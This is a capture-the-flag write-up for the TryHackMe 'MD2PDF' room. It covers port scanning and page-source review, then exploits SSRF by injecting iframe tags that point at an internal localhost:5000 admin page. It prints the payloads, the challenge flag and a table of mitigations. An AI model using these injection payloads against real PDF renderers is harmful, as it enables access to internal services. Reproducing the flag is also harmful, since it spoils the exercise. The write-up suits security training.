# CTF Write-Up: [MD2PDF](https://tryhackme.com/room/md2pdf)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## 🚩 Flag

<details>
<summary>Flag</summary>

`flag{1f4a2b6ffeaf4707c43885d704eaee4b}`

</details>

---

## 1. Reconnaissance

### Initial Nmap Scan

```
nmap <IP_ADDRESS> -vv -oN Nmap/Initial
```

```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 62
80/tcp   open  http    syn-ack ttl 61
5000/tcp open  upnp    syn-ack ttl 61
```

### Detailed Nmap Scan

```
nmap <IP_ADDRESS> -p 22,80,5000 -A -vv -oN Nmap/Detailed
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 | Not immediately useful |
| 80 | HTTP | Python/Flask (Werkzeug) | Public-facing MD2PDF app |
| 5000 | HTTP | Python/Flask (Werkzeug) | Internal MD2PDF instance — key target |

### Wappalyzer 

| Category | Detail |
|----------|--------|
| Editor | CodeMirror 5.60.0 |
| JavaScript Libraries | jQuery 3.3.1 |
| UI Framework | Bootstrap |

---

## 2. Web Enumeration

### Directory Brute-Force

```bash
gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

> No significant hidden directories found on port 80.

### Page Source Analysis

Inspecting the page source revealed the conversion logic. Markdown input is POSTed to `/convert`, rendered to HTML by a headless browser, and returned as a PDF:

```javascript
$("#convert").click(function () {
  const data = new FormData()
  data.append("md", editor.getValue())
  fetch("/convert", {
    method: "POST",
    body: data,
  })
  .then((response) => response.blob())
  .then((data) => window.open(URL.createObjectURL(data)))
})
```

### Key Observations

- The app accepts raw Markdown, renders it to HTML, then passes it to a **headless browser** (e.g. wkhtmltopdf / weasyprint) to generate the PDF.
- Port **5000** is running a second instance of the same app — inaccessible from the outside, but reachable from the server itself.
- The headless browser fetches resources **server-side**, making this vulnerable to **SSRF via HTML injection**.

---

## 3. Exploitation — SSRF via HTML Injection in PDF Renderer

### Vulnerability

The Markdown-to-PDF pipeline does not sanitise HTML tags in user input. Injecting an `<iframe>` causes the server-side headless browser to fetch the specified URL and embed the response in the generated PDF — giving us **Server-Side Request Forgery (SSRF)**.

### Step 1 — Confirm HTML Injection

Submit the following as Markdown input:

```html
<h1>test</h1>
```

> If the PDF renders a large heading, raw HTML is being passed through to the renderer — injection confirmed.

### Step 2 — SSRF to Internal Port 5000

Port 5000 is only accessible from localhost. Inject an iframe pointing to the internal service:

```html
<iframe src="http://localhost:5000" height="500" width="500"></iframe>
```

> The headless browser fetches `localhost:5000` server-side and embeds the response in the PDF. The returned PDF reveals the internal page — confirming SSRF.

### Step 3 — Access the Internal Admin Page

The internal instance exposes an `/admin` route not accessible from port 80:

```html
<iframe src="http://localhost:5000/admin" height="500" width="500"></iframe>
```

> The generated PDF contains the admin page — including the flag.

**Flag:**
```
flag{1f4a2b6ffeaf4707c43885d704eaee4b}
```

> 🚩 `flag{1f4a2b6ffeaf4707c43885d704eaee4b}`

---

## 4. Attack Chain

```
Nmap Scan
    └─► Ports 80 and 5000 — both running MD2PDF (Flask/Python)
    └─► Port 5000 not directly accessible externally

Page Source Analysis
    └─► Markdown POSTed to /convert → rendered as HTML → headless browser → PDF
    └─► No HTML sanitisation on user input

HTML Injection Confirmed
    └─► <h1>test</h1> renders in PDF output

SSRF via iframe
    └─► <iframe src="http://localhost:5000"> — internal service embedded in PDF

Admin Endpoint
    └─► <iframe src="http://localhost:5000/admin"> — flag retrieved
```

---

## 5. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---|---|---|
| 1 | No HTML sanitisation on Markdown input | Arbitrary HTML injected into the PDF renderer | Strip or escape HTML tags before passing to the renderer; use a strict Markdown parser |
| 2 | SSRF via headless browser | Attacker can reach internal services (port 5000) not exposed externally | Restrict outbound requests from the PDF renderer using a firewall or network policy; block `localhost` and RFC 1918 addresses |
| 3 | Internal admin endpoint unauthenticated | `/admin` accessible to anyone who can reach port 5000 — trivially exposed via SSRF | Require authentication on all admin routes regardless of network location; never rely on network isolation alone |
| 4 | Two instances of the app running unnecessarily | Increased attack surface | Consolidate to a single instance; expose admin functionality only with proper auth |

---

*MD2PDF — TryHackMe | Rooted ✅*
